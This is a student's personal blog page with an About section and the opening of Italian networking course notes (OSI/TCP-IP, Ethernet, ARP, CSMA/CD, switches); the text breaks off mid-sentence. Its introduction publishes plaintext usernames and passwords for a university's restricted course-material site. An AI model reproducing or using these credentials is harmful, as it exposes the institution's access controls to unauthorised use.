<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>My Personal Blog :: ML</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="About DONEAbout Hello stranger, and welcome to my personal blog!
My name is Matteo Lugli, and I am currently an undergraduate student at university of Modena. I study Computer Science, which is also one of my biggest passions. That&amp;rsquo;s why here you will mainly find I.T related posts and articles, together with some of my university notes.
You&amp;rsquo;ll find more information about me down below.
Enjoy! ( I mean life, in general ;) )" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/content/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/blue.css">



<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/blue.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="My Personal Blog">
<meta property="og:description" content="About DONEAbout Hello stranger, and welcome to my personal blog!
My name is Matteo Lugli, and I am currently an undergraduate student at university of Modena. I study Computer Science, which is also one of my biggest passions. That&amp;rsquo;s why here you will mainly find I.T related posts and articles, together with some of my university notes.
You&amp;rsquo;ll find more information about me down below.
Enjoy! ( I mean life, in general ;) )" />
<meta property="og:url" content="/content/" />
<meta property="og:site_name" content="ML" />

  
    <meta property="og:image" content="/img/favicon/blue.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-10-28 12:14:50 &#43;0200 CEST" />












</head>
<body class="blue">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Home
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/challenges">Challenges</a></li>
        
      
        
          <li><a href="https://github.com/theElandor">Github</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Uni-Notes ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/gestione">Inform. Retrieval</a></li>
              
            
              
                <li><a href="/compilatori">Linguaggi e Compilatori</a></li>
              
            
              
                <li><a href="/ml">Machine Learning and Deep Learning</a></li>
              
            
              
                <li><a href="/reti">Reti</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/challenges">Challenges</a></li>
      
    
      
        <li><a href="https://github.com/theElandor">Github</a></li>
      
    
      
        <li><a href="/gestione">Inform. Retrieval</a></li>
      
    
      
        <li><a href="/compilatori">Linguaggi e Compilatori</a></li>
      
    
      
        <li><a href="/ml">Machine Learning and Deep Learning</a></li>
      
    
      
        <li><a href="/reti">Reti</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/content/">My Personal Blog</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-10-28
        
      </span>
    
    
    
  </div>

  
  


  

  <div class="post-content"><div>
        <h2 id="about">About<a href="#about" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="about"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> About<a href="#about" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Hello stranger, and welcome to my personal blog!</p>
<p>My name is Matteo Lugli, and I am currently an undergraduate student at university of Modena.
I study <strong><code>Computer Science</code></strong>, which is also one of my biggest passions. That&rsquo;s why here you will mainly find I.T related posts and articles,
together with some of my university notes.</p>
<p>You&rsquo;ll find more information about me down below.</p>
<p><strong>Enjoy!</strong> ( I mean life, in general ;) )</p>

  <figure class="left" >
    <img src="/ox-hugo/profile.jpg"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 1: </span>This is me.</figcaption>
    
  </figure>


<ul>
<li>
<p><strong>Age</strong>: 21</p>
</li>
<li>
<p><strong>Birthday</strong>: 1/8/2001</p>
</li>
<li>
<p><strong>Other interests</strong>: Productivity, Reading,  Vintage Technology,
Dungeons and Dragons, Boardgames.</p>
</li>
<li>
<p><strong>Favourite books</strong>:</p>
<ul>
<li>Deep Work (Cal Newport);</li>
<li>How to win friends and influence people (Dale Carnegie);</li>
<li>The Old Man and the Sea (Ernest_Hemingway);</li>
<li>Walden; or, Life in the Woods (Henry_David_Thoreau);</li>
</ul>
</li>
<li>
<p>Favourite quote</p>
<blockquote>
<p>[&hellip;] <em>but man is not made for defeat.</em></p>
<p>Ernest_Hemingway</p>
</blockquote>
</li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> #\##|   |
##\\ |   |
   \\|   \&#39;---&#39;/
    \   _&#39;.&#39;O&#39;.&#39;
     | :___   \
     |  _| :  |
     | :__,___/
     |   |
</code></pre></div><h2 id="reti">Reti<a href="#reti" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="reti"><!-- raw HTML omitted -->DONE<!-- raw HTML omitted --> Protocolli e architetture di rete ITA-(2022/2023)<a href="#reti" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

  <figure class="left" >
    <img src="/ox-hugo/internet.jpeg"   />
    
  </figure>


<h4 id="cosa-posso-trovare-qui"><em>Cosa posso trovare qui?</em><a href="#cosa-posso-trovare-qui" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Questa pagina (in italiano) contiene i miei appunti del corso di
&ldquo;Protocolli e architetture di rete&rdquo; del corso triennale di informatica
di Unimore.
Verranno quindi riportati gli approfondimenti/chiarimenti che vengono
fatti durante le lezioni. Il materiale include i write-up delle esperienze
fatte in laboratorio.</p>
<p>→ Link per accedere al <code>materiale didattico</code>:</p>
<p>2022/2023 &ndash;&gt; <a href="https://weblab.ing.unimore.it/protocolli/2223">https://weblab.ing.unimore.it/protocolli/2223</a></p>
<p>2021/2022 &ndash;&gt; <a href="https://weblab.ing.unimore.it/protocolli/2122/">https://weblab.ing.unimore.it/protocolli/2122/</a></p>
<p>Le credenziali per accedere al materiale di quest&rsquo;anno sono:</p>
<ul>
<li><strong>username</strong>: PAR2223</li>
<li><strong>password</strong>: Kaw8Meir</li>
</ul>
<p>Le credenziali per accedere al materiale dell&rsquo;anno scorso sono:</p>
<ul>
<li><strong>username</strong>: PAR2122</li>
<li><strong>password</strong>: Enae3pie</li>
</ul>
<h4 id="troubleshooting"><em>Troubleshooting</em><a href="#troubleshooting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Se la pagina non carica correttamente i contenuti in latec, basta <code>ricaricare</code> la pagina
una o al massimo un paio di volte. Questo problema può essere legato alla grande
quantità di testo e immagini presenti in questa sezione.</p>
<hr>
<h4 id="table-of-contents">TABLE OF CONTENTS<a href="#table-of-contents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<ul>
<li><a href="#metodi-di-comunicazione">METODI DI COMUNICAZIONE</a></li>
<li><a href="#protocollo-tcp-ip">PROTOCOLLO TCP/IP</a></li>
<li><a href="#htn--introduzione">(HTN) INTRODUZIONE</a></li>
<li><a href="#htn--lan-e-ethernet">(HTN) LAN e ETHERNET</a></li>
<li><a href="#htn--interconnessioni-di-rete-e-accesso-a-internet">(HTN) INTERCONNESSIONI DI RETE E ACCESSO A INTERNET</a></li>
<li><a href="#ip--livello-ip">(IP) Livello IP</a></li>
<li><a href="#ip--ip-routing">(IP) Ip routing</a></li>
<li><a href="#lab-6-10">Lab 6-10</a></li>
<li><a href="#lab-20-10">Lab 20-10</a></li>
<li><a href="#lab-27-10">Lab 27-10</a></li>
<li><a href="#esercizi">Esercizi</a></li>
</ul>
<hr>
<h4 id="metodi-di-comunicazione">METODI DI COMUNICAZIONE<a href="#metodi-di-comunicazione" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>

  <figure class="left" >
    <img src="/ox-hugo/protocolli_intro_sintesi.png"   />
    
  </figure>


<p>I protocolli hanno senso se condivisi, bisogna definire degli <strong>standard</strong>
comuni.</p>
<ul>
<li><code>ISO/OSI</code> &ndash;&gt; standard <strong>de iure</strong>, prima progettato su carta.</li>
</ul>
<p>Sviluppato su 7 livelli come in Figura 1. Il pacchetto viene &ldquo;inviato&rdquo;
dallo strato fisico di un host all&rsquo;altro, poi viene &ldquo;depacchettizzato&rdquo;.</p>
<ol>
<li><strong>Livello fisico</strong> : interessante dal punto di vista elettronico.</li>
<li><strong>Livello di collegamento</strong>: stabilisce come vengono strutturati i pacchetti
appena prima che vengano trasmessi fisicamente.Il pacchetto a questo
stadio viene anche chiamato <strong>frame</strong> (es. contiene dei bit per sincronizzare le schede di rete prima
della configurazione effettiva).</li>
<li><strong>Livello di rete</strong> Livello centrale, si occupa dell&rsquo;instradamento dei pacchetti.</li>
<li><strong>Livello di trasporto</strong>: trasporto dei pacchetti nella rete (nodi).</li>
<li><strong>Livello di sessione</strong>: vuole ricreare un&rsquo;astrazione di alto livello, ri-orgranizzando
i pacchetti.</li>
<li><strong>Livello di presentazione</strong>: si occupa di come viene <em>rappresentata</em> l&rsquo;informazione.</li>
<li><strong>Livello di applicazione</strong>: fornisce un&rsquo;interfaccia per le applicazioni
che si interfacciano con la rete.</li>
</ol>

  <figure class="left" >
    <img src="/ox-hugo/osi_layers.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 2: </span>ISO/OSI stack</figcaption>
    
  </figure>


<ul>
<li><strong><code>TCP/IP</code></strong> &ndash;&gt; ha prevalso nello sviluppo di internet.</li>
</ul>
<p>Diversi layer comportano un costo &ndash;&gt; si cerca di snellire lo stack,
diminuendo il numero di livelli. Nonostante ciò, si vuole mantanere
la numerazione precedente (Livello trasporto &ndash;&gt; 4, Livello Rete &ndash;&gt; 3).</p>

  <figure class="left" >
    <img src="/ox-hugo/tcpip.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 3: </span>tcp/ip stack</figcaption>
    
  </figure>


<hr>
<h4 id="protocollo-tcp-ip">PROTOCOLLO TCP/IP<a href="#protocollo-tcp-ip" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>

  <figure class="left" >
    <img src="/ox-hugo/htn.png"   />
    
  </figure>


<p>2- <strong>Host to Network</strong> Modifiche del protocollo HTN non dovrebbero impattare il resto della rete:
(es. posso creare una rete universitaria, basta avere l&rsquo;hardware necessario).</p>
<p>3- <strong>Network</strong>: Protocollo per la consegna dei pacchetti da un host mittente
ad un destinatario. Ci si occupa semplicemente dell&rsquo;invio dei pacchetti,
non ci si preoccupa di sessioni, pacchetti mancanti, congestione, o simili.</p>
<p>4- <strong>Transport</strong>: servizio di consegna con impegno tra due <em>processi applicativi</em>
che stanno eseguendo su due host terminali. (es TCP, UDP);</p>
<p>5- <strong>Application</strong>: lo vedremo in seguito.</p>
<p>i layer 3 e 4 sono sempre essenzialmente quelli, possono cambiare spesso i livelli
2 e 5 nelle telecomunicazioni!</p>

  <figure class="left" >
    <img src="/ox-hugo/clessidra.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 4: </span>Modello a clessidra</figcaption>
    
  </figure>


<p>(es. Alcune applicazioni potrebbero avere la necessità di sfruttare il protocollo
TCP perchè <strong>vuole garantire la consegna di tutti i pacchetti</strong> ).</p>
<p>(es. A livello host to network, una rete wireless potrebbe preoccuparsi della
garanzia di consegna dei pacchetti. In questo modo risolvo <strong>localmente</strong> un possibile
problema di non consegna dei pacchetti. Se non me ne preoccupo localmente, un&rsquo;altro
host dall&rsquo;altra parte del mondo potrebbe ricevere dei dati non completi.)</p>
<p>(solitamente ci si occupa dell&rsquo;affidabilità a livello <strong>end to end</strong>, a me interessa
che le applicazioni comunichino correttamente!)</p>
<p>&ndash;&gt; <strong>morale</strong>: posso decidere di risolvere i problemi in diversi layer dello stack,
quindi a seconda del contesto si possono spostare alcune funzioni in altri livelli
dello stack.</p>
<p>Non tutti i dispositivi(nodi) implementano tutto lo stack, si possono basare
soltanto su alcuni layer. Switch e bridge sono dispositivi di livelo 2,
che basano il loro funzionamento <strong>soltanto</strong> sul livello 2 (non sanno nulla
del protocolli IP ad esempio)! Il concetto è estendibile: un <strong>router</strong>
legge fino al livello 3, quindi fino all&rsquo;indirizzo IP!</p>

  <figure class="left" >
    <img src="/ox-hugo/switch.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 5: </span>Dispositivi Livello 2</figcaption>
    
  </figure>


<p>Tuttavia esistono delle eccezioni, come gli switch di livello 3, quindi
anche qua c&rsquo;è flessibilità.</p>
<p><strong>Deep packet inspection:</strong> &ndash;&gt; quando si parla di dispositivi che sono in
grado di analizzare più in profondità i pacchetti: riesce a leggere informazioni
anche a livelli più alti dello stack.</p>
<hr>
<h4 id="htn--introduzione">(HTN) INTRODUZIONE<a href="#htn--introduzione" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>
<p>Gli scopi del livello Host to Network sono:</p>
<ul>
<li><strong><code>interconnessione</code></strong> tra due o più host;</li>
<li><strong><code>trasmisionne di dati</code></strong> tra host interconnessi;</li>
<li><strong><code>connessione</code></strong> di un host a internet;</li>
</ul>
<p>Nello stack TCP/IP questi 3 aspetti sono fortemente interconnessi
tra di loro.</p>
<p>Alcuni esempi:</p>
<ul>
<li><strong>LAN</strong> wired: Ethernet;</li>
<li><strong>LAN</strong> wireless: 802.11x;</li>
<li><strong>PAN</strong>: (Bluetooth);</li>
<li>Mediante <strong>modem</strong>;</li>
<li><strong>WAN</strong> wireless;</li>
</ul>
<p>L&rsquo;unità informativa è chiamata <code>frame</code> (host-
router/switch, router/switch-router/switch, host-host).</p>
<p>Come anticipato, il livello H2N comprende 2 sottolivelli:</p>
<ol>
<li>Livello &ldquo;<strong>fisico</strong>&quot;:
ci si riferisce alla vera e propria connessione &ldquo;fisica&rdquo; tra gli host
(cavo coassiale, fibra ottica, trasmissione radio, modem);</li>
<li>Livello &ldquo;<strong>data link</strong>&quot;: che si occupa dell&rsquo;incapsulamento e invio
dei dati tra gli host.</li>
</ol>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Modalità di trasmissione</p>
<ol>
<li><strong><code>Unicast</code></strong> &ndash;&gt; un mittente e un destinatario;</li>
<li><strong>Multicast</strong> &ndash;&gt; comunicazione tra un mittente e un gruppo di destinatari;</li>
<li><strong>Anycast</strong> &ndash;&gt; mittente che vuole comunicare con <strong>un</strong> mittente in un gruppo;</li>
<li><strong><code>Broadcast</code></strong> &ndash;&gt; mittente che vuole comunicare un&rsquo;informazione a tutti;</li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Tipi fisici di collegamento</p>
<ol>
<li>
<p><code>Mezzo broadcast</code> Un mezzo broadcast è un mezzo attraverso il quale un host invia informazioni
a tutti gli host collegati. Si può sfruttare un dispositivo broadcast per
riservare delle informazioni (ad es.) ad alcune interfacce di rete.</p>
</li>
<li>
<p><code>Mezzo punto a punto</code> collegamento pensato per fornire comuncazione tra 2
punti soltanto.</p>
<ul>
<li><strong>Half-Duplex</strong>: collegamento che permette ad un solo host di inviare dati sul mezzo fisico
in un determinato instante.</li>
<li><strong>Full-Duplex</strong>: collegamento bidirezionale, collegamenti interni dedicati
per entrambe le direzioni (nel caso di un punto a punto).</li>
</ul>
</li>
</ol>
<p>E' importante capire bene la differenza tra <strong>modalità di trasmissione</strong> e
<strong>tipi fisici di collegamento</strong>. Infatti, a prescindere dal mezzo, un
protocollo può prevedere molteplici modalità di trasmissione.</p>
</li>
</ul>
<h4 id="htn--lan-e-ethernet">(HTN) LAN e ETHERNET<a href="#htn--lan-e-ethernet" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="#table-of-contents"> &ndash;&gt; TOC</a></p>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Introduzione</p>
<p>Rete che consente la comunicazione tra dispositivi a livello locale.
Una rete locale può anche essere estesa a livello cittadino, o regionale.
Essa ha un <em>numero limitato di nodi</em>!</p>
<p><code>Backbone LAN</code> &ndash;&gt; Lan dedicate a collegare tante altre reti. Sono dorsali informatiche
che permettono la comunicazione ad alta velocità (solitamente tramite fibra ottica) tra
due punti anche molto distanti tra di loro. Sono di proprietà delle grandi aziende
di telecomunicazioni. In Italia, uno dei principali backbone network è la rete universitaria
GARR che collega attraverso reti sottomarine in fibra ottical&rsquo;università Federico II di Napoli
alla città di New York.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Scheda di rete</p>
<p>Un host connesso a internet ha un dispositivo fatto apposta per il protocollo H2N,
prende il nome di &ldquo;scheda di rete&rdquo;. La scheda di rete si occupa del frame (in certi casi
anche di una minima parte della logica), mentre
solitamente il sistema operativo si occupa solo delle <strong>informazioni logiche</strong>.
Quindi in realtà quando si parla di H2N non bisogna immaginarsi il dispositivo (pc, tablet) ma
la vera e propria scheda di rete.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Topologie</p>
<ol>
<li><code>BUS</code> &ndash;&gt; Consiste in un cavo che collega tutti gli host, i messaggi
vengono inviati a tutti gli host come segnali elettrici, ma accettati
solo dal reale destinatario. Il problema è che se il cavo si rompe in
qualsiasi punto, la rete si rompe e non funziona più.</li>
<li><code>ANELLO</code> &ndash;&gt; Un host che riceve un pacchetto si chiede se il pacchetto
è destinato a lui. Se non è per lui, quell&rsquo;host <strong>inoltra</strong> il pacchetto!
L&rsquo;host destinatario assorbe il pacchetto quando gli arriva.</li>
<li><code>STELLA</code> &ndash;&gt; Gli host sono connessi ad un dispositivo centrale dedicato.
Si riescono a raggiungere distanze maggiori (due host possono essere
distanti &ldquo;2 cavi&rdquo;). La rottura di un collegamento provoca solo
l&rsquo;interruzione della connessione con un host. Il problema è che
se si rompe il dispositivo centrale (o si congestiona) la rete
si rompe o si rallenta.</li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Protocollo Ethernet</p>
<p>Protocollo per realizzare <strong>reti locali</strong>. (Nello stack TCP/IP siamo
sempre nel livello h2n.) Questo protocollo era inizialmente progettato per funzionare
su reti cablate con <strong>topologia a BUS</strong> (velocità nell&rsquo;ordine dei Mbit, quando venne ideata). Ora le schede di
rete reggono velocità anche a livello di Gbit. Teoricamente
il protocollo Ethernet può essere implementato anche con cavi ottici.
In realtà al giorno d&rsquo;oggi questo protocollo è usato con topologia a stella,
molto più sicura e diffusa.</p>
<ul>
<li>Il cavo bus deve avere due &ldquo;terminatori&rdquo; che assorbono la corrente.</li>
<li><strong>Motivi del successo di ethernet:</strong>
<ol>
<li>Poco costosa;</li>
<li>Flessibile e si presta a diverse tecnologie/topologie;</li>
<li>Rapida diffusione iniziale che ha preso il controllo del mercato;</li>
</ol>
</li>
</ul>
<p>Vediamo ora alcuni aspetti fondamentali del protocollo ethernet:</p>
<p><strong><code>Indirizzo MAC</code></strong>:</p>
<p>Gli indirizzi MAC sono gli identificatori usati nel protocollo ethernet.</p>
<p>Esempio: 81:F4:A3:AA:9C:49 &ndash;&gt; 6 byte (8 bit ogni coppia). Questo
tipo di indirizzo è detto <strong>flat</strong>: le cifre non hanno un valore
&ldquo;posizionale&rdquo;. Soltanto i primi 3 byte servono per identificare
il produttore della scheda di rete: con questo stratagemma si evita
di generare indirizzi hardware uguali tra produttori diversi.</p>
<p>Questi indirizzi valgono <strong>per la stessa rete locale</strong>. Ovviamente
la rete funziona correttamente se questi indirizzi sono <strong>univoci</strong>!
Ogni indirizzo MAC è associato ad un&rsquo;interfaccia di rete (a livello Hardware).
Essenzialmente viene scritto all&rsquo;interno della scheda di rete dal
produttore stesso.</p>
<p>Non ci sono misure forti che permettono a chi controlla l&rsquo;host
di &ldquo;camuffare&rdquo; l&rsquo;indirizzo MAC che il sistema operativo usa per
inviare i pacchetti.</p>
<ul>
<li>FF-FF-FF-FF-FF-FF: <strong>indirizzo di broadcast</strong>, serve per identificare
comunicazioni broadcast in reti ethernet.</li>
</ul>
<p>All&rsquo;interno del <strong>frame</strong> del pacchetto inviato viene inserito
l&rsquo;indirizzo MAC del destinatario. In una topologia BUS, a livello
elettrico tutti ricevono fisicamente il pacchetto, a livello logico
lo riceve soltanto il destinatario. Di default, l&rsquo;interfaccia di rete
confronta il suo indirizzo MAC con quello inserito all&rsquo;interno del frame.
Ci sono alcune eccezioni:</p>
<ul>
<li>Il frame contiene l&rsquo;indirizzo destinatario broadcast;</li>
<li>Sull&rsquo;host sta eseguendo un software di sniffing. In questo caso
l&rsquo;interfaccia di rete si dice in modalità <strong>promiscua</strong>.</li>
</ul>
<p>L&rsquo;indirizzo IP non basta da solo principalmente per 2 motivi:</p>
<ol>
<li>Se l&rsquo;indirizzo IP fosse salvato nella NIC al posto dell&rsquo;indirizzo MAC,
quando il dispositivo si connette ad una diversa rete locale,
quell&rsquo;indirizzo all&rsquo;interno della scheda dovrebbe essere riconfigurato
ogni singola volta!</li>
<li>Le NIC non sarebbero in grado di sopportare protocolli diversi da IP.</li>
</ol>
<p><strong><code>Frame Ethernet</code></strong>:</p>
<ol>
<li>
<p><strong>Preambolo</strong>: sequenza di 8 byte che serve alle interfacce di rete
per comunicare correttamente a livello fisico. (&ldquo;Framing&rdquo;)
L&rsquo;ultimo byte è una sequenza che indica la fine del preambolo,
l&rsquo;ultimo bit di questa ultima sequenza è sempre 1.
Del preambolo si preoccupa solo l&rsquo;interfaccia di rete, poi quella
sequenza viene &ldquo;scartata&rdquo;, il S.O. non se ne preoccupa.</p>
</li>
<li>
<p><strong>Indirizzo destinatario</strong> (6 byte):
se in questo indirizzo tutti i byte sono settati a 1 allora
il frame ethernet è detto frame <strong>broadcast</strong>.</p>
</li>
<li>
<p><strong>Indirizzo sorgente</strong> (6 byte);</p>
</li>
<li>
<p><strong>Camp tipo</strong> (2 byte): serve a implementare il <strong>multiplexing</strong>.
Serve al sistema operativo (destinatario) per capire cosa fare
del pacchetto ricevuto. (Devo essere in grado di collegare i vari livelli,
devo &ldquo;codificare&rdquo; che payload sto trasportando). In altre parole,
serve all’adattatore per sapere a quale dei protocolli dello strato di rete debba
essere passato il campo dati di ciascun frame ricevuto.</p>
</li>
<li>
<p><strong>CRC</strong>: Informazione di controllo che si trova dopo
il pacchetto dati. Per questo si parla di &ldquo;frame&rdquo;,
perchè il payload viene &ldquo;circondato&rdquo;. Il CRC serve per controllare
l&rsquo;integrità del paccheto: viene calcolato dall&rsquo;interfaccia di rete del mittente
durante l&rsquo;invio del pacchetto con un algoritmo (detto a sua volta CRC). Il
destinatario calcola a sua volta il CRC (in base ai dati che gli arrivano) e lo confronta
con il CRC ricevuto. Se i due valori coincidono, allora la
trasmissione è avvenuta correttamente.</p>
<p>Il CRC(Controllo di Ridondanza Ciclico) viene generato sulla base del contenuto di 2,3,4 e dei dati (payload).</p>
</li>
</ol>
<p>Il payload (dati) si trova tra la 4  e la 5 sequenza.</p>
<p><strong><code>MTU</code></strong>: (<em>Maximum Transfer Unit</em>) Dimensione massima trasferibile sulla rete, a livello
di pacchetto. (solitamente 1500 byte)
Il livello H2N usa lo <strong>stuffing</strong> per &ldquo;completare&rdquo; i pacchetti
che hanno dimensione minore di 46 byte.
Tutte le schede di rete di una rete ethernet devono essere
configurate con la stessa MTU! (essendo un campo comunque variabile,
un amministratore di rete potrebbe decidere di cambiarne il valore)</p>
<p><strong><code>Protocollo ARP</code></strong>:
(<em>Adress resolution protocol</em>)</p>
<p>Di base quando si vuole inviare un pacchetto ad un host, non
si conosce l&rsquo;indirizzo MAC del destinatario.
Il protocollo ARP prende come in input l&rsquo;indirizzo IP del
destinatario, e come output ha l&rsquo;indirizzo MAC del destinatario.</p>
<ul>
<li>
<p><strong>Richiesta ARP</strong>: messaggio broadcast che ha come payload
l&rsquo;indirizzo IP che l&rsquo;host sta cercando. Questo messaggio
viene ricevuto da tutti gli host connessi alla rete, ma
l&rsquo;unico che risponde è chi ha l&rsquo;indirizzo IP ricercato.
La risposta contiene l&rsquo;indirizzo MAC associato a l&rsquo;indirizzo
IP iniziale.</p>
<p><strong>La risposta è unicast</strong>, il destinatario manda il MAC adress
solo a chi l&rsquo;ha richiesto.</p>
<p>Questo modo di richiedere un indirizzo MAC è effettuabile
soltanto su una rete <strong>contenuta</strong>: è difficile mandare un
messaggio broadcast saturando una rete che connette troppi host.
I pacchetti usati per richieste / risposte ARP sono pacchetti
&ldquo;assestanti&rdquo; soltanto a livello h2n, non hanno un livello 3.
Per questo è un &ldquo;sottoprotocollo&rdquo; dell&rsquo;Ethernet.</p>
<p>Il fatto che non sia riuscito ad ottenere l&rsquo;indirizzo MAC
del destinatario (nel caso in cui effettivamente non ci sia),
è un&rsquo;informazione implicita che si ottiene grazie ad un &ldquo;<strong>timeout</strong>&rdquo;.</p>
</li>
<li>
<p><strong>ARP Table</strong>: cache che conserva il mapping IP-MAC per
un certo periodo di tempo, per migliorare la performance.
La ARP cache è gestita totalmente a livello di sistema operativo.
Un amministratore potrebbe voler configurare staticamente
delle associazioni IP-ARP, nel caso in cui la rete
sia fissa e non avvezza a cambiamenti di varia natura.</p>
<p>Esempio di una entry:</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Indirizzo Ip</th>
<th>Indirizzo MAC</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>222.222.222.221</td>
<td>88-B2-2F-54-1A-0F</td>
<td>13:45:00</td>
</tr>
</tbody>
</table>
<p><strong><code>Protocollo CSMA/CD</code></strong>:</p>
<p>Protocollo di accesso al mezzo che serve per rilevare le collisioni tra pacchetti nelle reti
ethernet. Nelle reti wifi si vuole evitare la collisione, il suo protocollo prende
infatti il nome di CSMA/CA &ndash;&gt; (<em>Collision Avoidance</em>), più
complesso e costoso!</p>
<ul>
<li><strong>Carrier sense</strong>: L&rsquo;interfaccia di rete prima di iniziare a inviare pacchetti
si mette in ascolto, cerca di capire se qualcuno sta già trasmettendo;</li>
<li><strong>Listen while talking</strong>: le interfacce di rete cercano di rilevare
segnali in ingresso anche durante la trasmissione. In tal caso
si assume che avvenga una collisione, quindi l&rsquo;interfaccia si ferma
di inviare dati. &ndash;&gt; L&rsquo;interfaccia invia un segnale <strong>JAMMING</strong>, anche
tutte le altre interfacce si mettono in pausa!</li>
<li><strong>Inter Frame Gap (IFG)</strong>: lunghezza del pacchetto dati più piccolo.
I frame emessi da un host sono distanziati da un Inter Frame Gap,
in modo da permettere agli altri host di capire la fine di un
frame e l&rsquo;inizio di un altro.
Un host prima di iniziare a trasmettere su un canale, sta in
ascolto per la durata di un IFG in modo da capire se il canale
sia libero o meno.</li>
<li><strong>Ritardo pseudo-casuale</strong> &ndash;&gt; si ri-inizia a inviare i pacchetti
applicando un ritardo casuale che si spera sia diverso per i vari
segnali.</li>
<li><strong>Binary Exponential Back-off (BEB)</strong> &ndash;&gt; algoritmo che decide
il delay della trasmissione. Il delay è compreso tra [0, 2^n-1],
quindi aumenta esponenzialmente ad ogni &ldquo;stop&rdquo;.</li>
</ul>

  <figure class="left" >
    <img src="/ox-hugo/BEB.png"   />
    
  </figure>


<p>Il calcolo viene effettuato in base alla velocità della rete, non
si lavora mai con tempi assoluti. Aumentando esponenzialmente la
grandezza dell&rsquo;insieme di valori da cui si sceglie il ritardo di
trasmissione, l&rsquo;host riesce a riadattare la trasmissione al traffico
che attualmente è presente nella rete. In presenza di sovraccarico,
ovviamente il ritardo di trasmissione è molto alto!</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Tipi di dispositivi</p>
<p><strong><code>Hub</code></strong> (l1): ripetitore di segnale, sono deprecati.
Funge da centro stella, ogni volta che gli arrivano segnali elettrici
lui li replica e lo manda su tutte le porte. Replica anche le collisioni!</p>
<p><strong><code>Switch</code></strong> (l2): consentono un <strong>inoltro selettivo</strong> dei frame:
più host possono comunicare contemporaneamente nella stessa rete.
Gli unici dati che lo swtich legge del frame ethernet sono gli
indirizzi MAC.</p>
<ul>
<li><strong>store and forward</strong>: gli switch solitamente prima di inoltrare
il pacchetto lo memorizza per analizzarlo. Se uno switch finisce
la memoria (in caso di congestione) alcuni pacchetti potrebbero
essere persi/eliminati. Questo meccanismo permette allo switch
di gestire le collisioni fisiche!</li>
</ul>
<!-- raw HTML omitted -->
<ol>
<li><strong>filtraggio</strong>: tabella di filtraggio che conserva la corrispondenza
tra indirizzo MAC dell&rsquo;host, la porta a cui è collegata e il tempo
di vita di questa informazione.
Inizialmente uno switch un hub che cerca di ottenere informazioni
sugli host collegati alle sue porte.
Da non configurato inoltra a tutti e inizia ad auto-apprendere in
base ai pacchetti che gli arrivano.</li>
</ol>
<!-- raw HTML omitted -->
<ol>
<li><strong>inoltro</strong> dei frame al MAC adress corretto.</li>
</ol>
<p>Se ad uno switch arrivano delle richieste provenenti da due host
(uno malevolo che ha copiato il MAC adress di un altro) con lo
stesso indirizzo MAC, lo switch si auto-configura ogni volta!
Ovviamente alcuni swtich più costosi hanno dei meccanismi di
difesa più complessi.</p>
<p>Se uno switch riceve pacchetti da troppi mac adress differenti,
finisce la memoria e non riesce più ad aggiornare la
tabella di filtraggio. In tal caso, lo switch torna a lavorare
